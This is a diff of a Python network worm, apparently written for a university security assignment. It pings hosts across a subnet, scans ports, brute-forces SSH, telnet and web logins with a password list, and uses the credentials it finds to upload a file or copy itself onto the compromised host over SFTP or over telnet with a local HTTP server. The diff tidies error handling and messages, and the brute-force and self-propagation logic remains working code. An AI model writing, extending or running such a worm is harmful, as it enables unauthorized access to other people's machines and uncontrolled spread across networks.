@@ -1,5 +1,4 @@
 #!/usr/bin/python3
-import constants
 import concurrent.futures
 
 from scapy.all import *
@@ -70,21 +69,24 @@ def main():
             port_open = scan_port(ip, port)
             print("Port %d is %s on %s" % (port, "open" if port_open else "closed", ip))
             if port_open:
-                bruteforce_function = {
-                    22: bruteforce_ssh,
-                    23: bruteforce_telnet,
-                    80: bruteforce_web,
-                    8080: bruteforce_web,
-                    8888: bruteforce_web
-                }[port]
+                try:
+                    bruteforce_function = {
+                        22: bruteforce_ssh,
+                        23: bruteforce_telnet,
+                        80: bruteforce_web,
+                        8080: bruteforce_web,
+                        8888: bruteforce_web
+                    }[port]
 
-                username_password = bruteforce_function(ip, port, username, password_list)
-                if username_password:
-                    print("Successfully logged into port %d with %s" % (port, username_password))
-                    if deploy_file and not deployed and (port == 22 or port == 23):
-                        credentials = username_password.split(":")
-                        deployed = transfer_file(ip, credentials[0], credentials[1], port, self_propagate,
-                                                 deployment_filename, script_filename)
+                    username_password = bruteforce_function(ip, port, username, password_list)
+                    if username_password:
+                        print("Successfully logged into port %d with %s" % (port, username_password))
+                        if deploy_file and not deployed and (port == 22 or port == 23):
+                            credentials = username_password.split(":")
+                            deployed = transfer_file(ip, credentials[0], credentials[1], port, self_propagate,
+                                                     deployment_filename, script_filename)
+                except KeyError:
+                    pass
 
         print("********** %s **********\n" % ip)
 
@@ -110,8 +112,8 @@ def bruteforce_ssh(ip, port, username, passwords):
             break
         except:
             pass
-
-        client.close()
+        finally:
+            client.close()
 
     return response
 
@@ -161,9 +163,12 @@ def bruteforce_web(ip, port, username, passwords):
 
 
 def read_file_from_list(file):
-    file_contents_list = []
     with open(file) as reader:
         file_contents_list = reader.read().splitlines()
+
+    if not file_contents_list:
+        print("File %s did not have any content" % file)
+        exit()
 
     return file_contents_list
 
@@ -187,18 +192,18 @@ def transfer_file(ip, username, password, port, self_propagate, deployment_filen
     successful = transfer_file_function(ip, username, password, target_directory, self_propagate, deployment_filename,
                                   script_filename)
 
-    if successful:
-        if self_propagate:
-            print("Self propagation successful. %s started on %s" % (script_filename, ip))
-        else:
-            print("File deployment successful")
+    if self_propagate:
+        information_message = "Success! %s started on %s\n" % (script_filename, ip) if successful else "Self propagation failed\n"
+    else:
+        information_message = "File deployment successful!\n" if successful else "File deployment failed\n"
 
+    print(information_message)
     return successful
 
 
 def transfer_file_with_sftp(ip, username, password, target_directory, self_propagate, deployment_filename,
                             script_filename):
-    information_message = "Attempting self propagation with SFTP" if self_propagate else "Deploying file with SFTP"
+    information_message = "Attempting self propagation with SFTP..." if self_propagate else "Deploying file with SFTP..."
     print(information_message)
     client = SSHClient()
     try:
@@ -247,7 +252,7 @@ def transfer_file_with_sftp(ip, username, password, target_directory, self_propa
                         time.sleep(0.1)
                         counter = counter + 1
 
-                    channel.recv(9999)
+                    channel.recv(1024)
                     time.sleep(0.1)
 
                 channel.close()
@@ -262,13 +267,13 @@ def transfer_file_with_sftp(ip, username, password, target_directory, self_propa
 
 def transfer_file_with_http_server(ip, username, password, target_directory, self_propagate, deployment_filename,
                                    script_filename):
-    information_message = "Attempting self propagation with HTTP" if self_propagate else "Deploying file with HTTP"
+    information_message = "Attempting self propagation with HTTP..." if self_propagate else "Deploying file with HTTP..."
     print(information_message)
 
     telnet_port = 23
 
     server_ip = get_server_ip_from_ip(ip)
-    port_number = get_port_number()
+    port_number = get_server_port_number()
 
     login_prompt = encode_in_ascii("login:")
     username_input = encode_in_ascii("%s\n" % username)
@@ -370,7 +375,7 @@ def deploy_file_to_server(file, deployment_filename, script_filename):
     copyfile(current_deployment_file_location, deployment_filename)
     copyfile(current_script_file_location, script_filename)
 
-    port_number = get_port_number()
+    port_number = get_server_port_number()
     server = ("", port_number)
     http = HTTPServer(server, SimpleHTTPRequestHandler)
 
@@ -435,8 +440,8 @@ def verify_file_exists(file):
 
 
 def get_target_directory(ip, username):
-    ip_octals = ip.split(".")
-    server_number = int(ip_octals[3]) - 1
+    last_ip_octal = ip[ip.rfind('.') + 1:]
+    server_number = int(last_ip_octal) - 1
     return "/home/%s/assign_2/server_%d" % (username, server_number)
 
 
@@ -453,8 +458,6 @@ def scan_against_interface(interface):
     src_ip = get_if_addr(interface)
     base_ip = src_ip[0: (src_ip.rfind('.') + 1)]
     replies_list = []
-    print(src_ip)
-    print(base_ip)
 
     with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
         executor.map(send(src_ip, base_ip, replies_list), range(1, 255))
@@ -468,8 +471,7 @@ def send(src_ip, base_ip, replies_list):
     # request times out.
     def send_icmp_request(last_ip_octal):
         dst_ip = base_ip + str(last_ip_octal)
-        print("Src: %s Dst: %s" % (src_ip, dst_ip))
-        if is_reachable(dst_ip, 4, src_ip):
+        if is_reachable(dst_ip, src_ip=src_ip, timeout=4):
             replies_list.append(dst_ip)
 
     return send_icmp_request
@@ -479,7 +481,7 @@ def encode_in_ascii(s):
     return s.encode("ascii")
 
 
-def get_port_number():
+def get_server_port_number():
     return 54325
 
 
